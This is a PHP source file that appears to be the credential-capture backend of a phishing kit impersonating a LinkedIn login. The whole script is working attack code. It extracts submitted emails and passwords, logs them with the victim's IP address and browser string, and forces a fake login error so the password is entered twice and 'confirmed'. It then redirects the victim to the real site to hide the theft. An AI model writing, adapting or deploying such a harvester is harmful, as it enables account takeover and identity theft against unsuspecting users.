<?php
session_start();
$dir = '../../captures/LIN';
if(!file_exists($dir))mkdir($dir,0755,true);
$ip=$_SERVER['REMOTE_ADDR']??'Unknown';
if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))$ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
$ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
$att=$_POST['attempt']??'1';
$email=$pass='';
foreach($_POST as $k=>$v){
    if($k=='platform'||$k=='attempt')continue;
    if(stripos($k,'pass')!==false||stripos($k,'pwd')!==false)$pass=$v;
    elseif(stripos($k,'user')!==false||stripos($k,'email')!==false||stripos($k,'login')!==false)$email=$v;
}
if(empty($email)&&isset($_POST['email']))$email=$_POST['email'];
if(empty($pass)&&isset($_POST['pass']))$pass=$_POST['pass'];
$file=$dir.'/LIN_'.date('Ymd_His')."_attempt$att.txt";
$content="PLATFORM:linkedin\nEMAIL:$email\nPASSWORD:$pass\nIP:$ip\nUA:$ua\n";
file_put_contents($file,$content,FILE_APPEND);
if($att=='1'){
    $_SESSION['clone_email']=$email;
    $_SESSION['clone_pass1']=$pass;
    header('Location:index.html?error=1&email='.urlencode($email));
}else{
    if($pass===($_SESSION['clone_pass1']??'')){
        file_put_contents($dir.'/CONFIRMED_SUMMARY.txt',"✅ $email | $pass | ".date('Y-m-d H:i:s')."\n",FILE_APPEND);
    }
    session_destroy();
    $urls=['linkedin'=>'https://linkedin.com','github'=>'https://github.com','discord'=>'https://discord.com','twitter'=>'https://x.com','x'=>'https://x.com','facebook'=>'https://facebook.com','instagram'=>'https://instagram.com','tiktok'=>'https://tiktok.com','gmail'=>'https://mail.google.com','netflix'=>'https://netflix.com','spotify'=>'https://spotify.com','twitch'=>'https://twitch.tv','reddit'=>'https://reddit.com'];
    $url=$urls['linkedin']??'https://www.linkedin.com';
    header('Location:'.$url);
}
exit;
?>